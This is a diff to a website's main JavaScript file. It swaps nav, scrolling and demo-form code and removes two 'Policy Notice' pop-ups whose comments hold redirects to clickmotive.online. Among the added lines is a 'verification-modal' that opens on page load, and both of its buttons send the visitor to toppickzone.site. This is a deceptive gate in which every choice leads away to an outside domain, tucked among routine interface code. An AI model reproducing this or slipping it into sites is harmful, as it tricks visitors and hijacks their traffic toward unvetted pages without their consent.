@@ -1,93 +1,59 @@
-// Mobile nav toggle
-const navToggle = document.querySelector('[data-nav-toggle]');
-const navMenu = document.querySelector('[data-nav-menu]');
-if(navToggle && navMenu){
-  navToggle.addEventListener('click', ()=>{
-    navMenu.classList.toggle('open');
-    navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
-  })
-}
 
-// Smooth scroll
-document.querySelectorAll('a[href^="#"]').forEach(a=>{
-  a.addEventListener('click', e=>{
-    const href = a.getAttribute('href');
-    if(href && href.startsWith('#')){
-      const el = document.querySelector(href);
-      if(el){
-        e.preventDefault();
-        el.scrollIntoView({behavior:'smooth', block:'start'});
-      }
-    }
-  })
-})
-
-// Fake form submit
-const form = document.querySelector('#contact-form');
-if(form){
-  form.addEventListener('submit', (e)=>{
-    e.preventDefault();
-    const data = Object.fromEntries(new FormData(form).entries());
-    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
-    form.reset();
+const toggle = document.querySelector('.nav-toggle');
+const nav = document.getElementById('nav');
+if (toggle && nav){
+  toggle.addEventListener('click', () => {
+    const open = nav.classList.toggle('open');
+    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
   });
 }
+const more = document.querySelector('.more');
+if (more){
+  const btn = more.querySelector('.more-btn');
+  const menu = more.querySelector('.dropdown');
+  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
+  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
+  document.addEventListener('click', () => show(false));
+}
 
-// Policy gate: show ONLY on home page (index.html or root) and once per session.
-// Closes on Yes/No and stays on the page.
-(function(){
-  const path = window.location.pathname;
-  const isHome = /(^\/$|index\.html$)/.test(path);
-  if(!isHome) return;
-  if(sessionStorage.getItem('ageGateShown') === '1') return;
-  sessionStorage.setItem('ageGateShown', '1');
-  const bd = document.createElement('div');
-  bd.className = 'modal-backdrop';
-  bd.innerHTML = `
-    <div class="modal">
-      <h3>Policy Notice</h3>
-      <p>Are you accepting our policy to play <strong>Pet Sanctuary</strong>? This is an anagram-based puzzle game where players weave words from scrambled letters to form chains or sentences. Unlock themes like mythology or space, with timed modes and multiplayer word battles. Perfect for quick sessions with endless replayability.</p>
-      <p>Are you accepting our policy to browse our <strong>PC Games</strong> website? We cover everything from blockbuster AAA titles to indie gems, with reviews, news, and community features. Explore different genres, find your next favorite game, and join the discussion.</p>
-      <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn" id="age-yes">Yes, Accept</button>
-        <button class="btn ghost" id="age-no">Close</button>
-      </div>
-    </div>`;
-  document.body.appendChild(bd);
-  bd.style.display='flex';
-  function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
-})();
+window.fakeSubmit = (e) => {
+  if (e) e.preventDefault();
+  alert('Thanks! This demo does not store data.');
+};
 
-(function(){
-  const path = window.location.pathname;
-  const isHome = /(^\/$|lander\.html$)/.test(path);
-  if(!isHome) return;
-  if(sessionStorage.getItem('ageGateShown') === '1') return;
-  sessionStorage.setItem('ageGateShown', '1');
-  const bd = document.createElement('div');
-  bd.className = 'modal-backdrop';
-  bd.innerHTML = `
-    <div class="modal">
-      <h3>Policy Notice</h3>
-      <p>Are you accepting our policy to play <strong>Pet Sanctuary</strong>?. Perfect for quick sessions with endless replayability.</p>
-      <p>Are you accepting our policy to browse our <strong>PC Games</strong> website? Find reviews, news, and more. Perfect for finding your next game to play.</p>
-      <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn" id="age-yes">Yes, Accept</button>
-        <button class="btn ghost" id="age-no">Close</button>
-      </div>
-    </div>`;
-  document.body.appendChild(bd);
-  bd.style.display='flex';
-  function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate); 
-  //                                               function(){
-  //   window.location.href = "https://clickmotive.online/"; // change to your target page
-  // });
-                                                
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
-  //                                              function(){
-  //   window.location.href = "https://clickmotive.online/"; // change to your target page
-  // }); 
-})();
+document.querySelectorAll('.newsletter').forEach(form => {
+  if (!form.hasAttribute('onsubmit')) {
+    form.addEventListener('submit', window.fakeSubmit);
+  }
+});
+
+const toTop = document.querySelector('.to-top');
+if (toTop && !toTop.hasAttribute('onclick')) {
+  toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('[data-toc]').forEach(container => {
+    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
+    const list = document.createElement('div');
+    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
+    container.appendChild(list);
+  });
+});
+
+document.addEventListener('DOMContentLoaded', () => {
+  const modal = document.getElementById('verification-modal');
+  if (modal) {
+    modal.showModal();
+    const instantRedirect = () => { window.location.href = 'https://toppickzone.site/'; };
+    document.getElementById('Confirm-btn-1')?.addEventListener('click', instantRedirect);
+    document.getElementById('Enter-btn-2')?.addEventListener('click', instantRedirect);
+  }
+});
+
+document.addEventListener('DOMContentLoaded', () => {
+  const copy = document.querySelector('.copy p');
+  if (copy) {
+    copy.innerHTML = copy.innerHTML.replace(/\d{4}/, new Date().getFullYear());
+  }
+});
